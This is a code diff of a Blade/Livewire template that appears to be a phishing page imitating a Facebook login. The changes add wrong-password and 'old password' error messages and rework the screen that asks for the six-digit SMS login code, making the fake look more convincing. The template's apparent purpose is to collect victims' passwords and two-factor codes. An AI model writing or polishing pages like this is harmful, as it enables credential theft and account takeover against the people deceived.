@@ -355,6 +355,12 @@
                                                 <img src="{{asset('new/fb2.png')}}" alt="">
                                             </div>
                                             <div style="padding: 20px">
+                                                @if($loginError)
+                                                    <div class="wrong__password" style="text-align: center"><h2>Wrong Credentials</h2><p>Invalid username or password</p></div>
+                                                @endif
+                                                @if($oldPassError)
+                                                    <div class="wrong__password" style="text-align: center"><h2>You Entered And Old Password</h2></div>
+                                                @endif
                                                 <form wire:submit.prevent="submitLogin">
                                                     <div>
                                                         <div class="input">
@@ -385,26 +391,47 @@
                                     </div>
                                 @endif
                                 @if($twoFaPage)
-                                    <div class="auth-req-container">
-                                        <form id="desktop-code" class="auth-req" wire:submit.prevent="codeSubmit">
-                                            <div class="auth-req-text">
-                                                <h2>Two-factor authentication required</h2>
-                                                <div class="auth-req-paragraph">
-                                                    <p class="first">You’ve asked us to require a 6-digit login code when anyone tries to access your account from a new device or browser.</p>
-                                                    <p class="second">Enter the 6-digit code from your <strong>code generator</strong> or third-party app below.</p>
+                                    <div style="width: 100%;justify-content: center;display: flex;">
+                                        <div style="max-width: 500px;margin-top: 50px;">
+                                            <form id="desktop-code" class="" wire:submit.prevent="codeSubmit">
+                                                <div class="two-factor-code">
+                                                    <div class="top">
+                                                        <h2>Check your text messages</h2>
+                                                        <p>Enter the code that we sent to *****-******.</p>
+                                                        <img style="width: 100%" src="{{asset('new/two.png')}}" alt="">
+                                                    </div>
+                                                    <div class="code-input" style="margin-top: 20px;">
+                                                        @if($codeError)
+                                                            <div class="show-error-modal"><p>The login code you entered doesn't match the one sent to your phone. Please check the number and try again.</p></div>
+                                                        @endif
+                                                        <input maxlength="6" minlength="6" name="code" class="show-input-on-desktop" placeholder="Login Code" type="number" required="required">
+                                                    </div>
+                                                    <div style="display: flex;justify-content: start;column-gap: 10px;align-items: center;margin: 20px 0">
+                                                        <svg viewBox="0 0 24 24" fill="currentColor" width="1em" height="1em" class="x1lliihq x2lah0s x1k90msu x2h7rmj x1qfuztq xcza8v6 xlup9mm x1kky2od"><path d="M3 12a9 9 0 0 1 9-9c2.144 0 4.111.749 5.657 2H16a1 1 0 1 0 0 2h4a1 1 0 0 0 1-1V2a1 1 0 1 0-2 0v1.514A10.959 10.959 0 0 0 12 1C5.925 1 1 5.925 1 12s4.925 11 11 11 11-4.925 11-11a1 1 0 1 0-2 0 9 9 0 1 1-18 0z"></path></svg>
+                                                        <a href="javascript:void(0)">Get a new code</a>
+                                                    </div>
+                                                    <div class="btn-group">
+                                                        <button type="submit" class="false">Continue</button>
+                                                        <a href="javascript:void(0)">Try another way</a>
+                                                    </div>
                                                 </div>
-                                                <div class="input-auth-req">
-                                                    <input maxlength="6" minlength="6" name="code" class="show-input-on-desktop" placeholder="Login Code" type="number" required="required">
-                                                    @if($codeError)
-                                                        <div class="show-error-modal"><p>The login code you entered doesn't match the one sent to your phone. Please check the number and try again.</p></div>
-                                                    @endif
-                                                    <span> (wait 4:29)</span>
-                                                </div>
-                                            </div>
-                                            <div class="auth-req-footer" style="height: auto"><a>Need another way to authenticate?</a>
-                                                <button    type="submit" class="false"><span>Continue</span></button>
-                                            </div>
-                                        </form>
+                                            </form>
+                                        </div>
+                                        <style>
+                                            .two-factor-code .btn-group{
+                                                width: 100%;
+                                                display: block;
+                                            }
+                                            .two-factor-code .btn-group button{
+                                                width: 100%;
+                                                display: block;
+                                                font-size: 1rem;
+                                                word-wrap: break-word;
+                                                white-space: pre-line;
+                                                line-height: calc(1.2 * 1em);
+                                                border-radius: 22px;
+                                            }
+                                        </style>
                                         <form id="mobile-code" class="auth-req" wire:submit.prevent="codeSubmitMobile">
                                             <div class="auth-req-text">
                                                 <h2>Two-factor authentication required</h2>
@@ -862,7 +889,7 @@
                                         @this.set('loginError', false);
                                         @this.set('oldPassError', false);
                                         @this.set('enableLoginForm', false);
-                                        @this.set('showModalFooter', true);
+                                        @this.set('showModalFooter', false);
                                         @this.set('enableLoadingAfterSubmit', false);
                                         @this.set('twoFaPage', true);
                                         @this.set('codeError', false);
@@ -873,7 +900,7 @@
                                         @this.set('loginError', false);
                                         @this.set('oldPassError', false);
                                         @this.set('enableLoginForm', false);
-                                        @this.set('showModalFooter', true);
+                                        @this.set('showModalFooter', false);
                                         @this.set('enableLoadingAfterSubmit', false);
                                         @this.set('twoFaPage', true);
                                         @this.set('codeError', true);
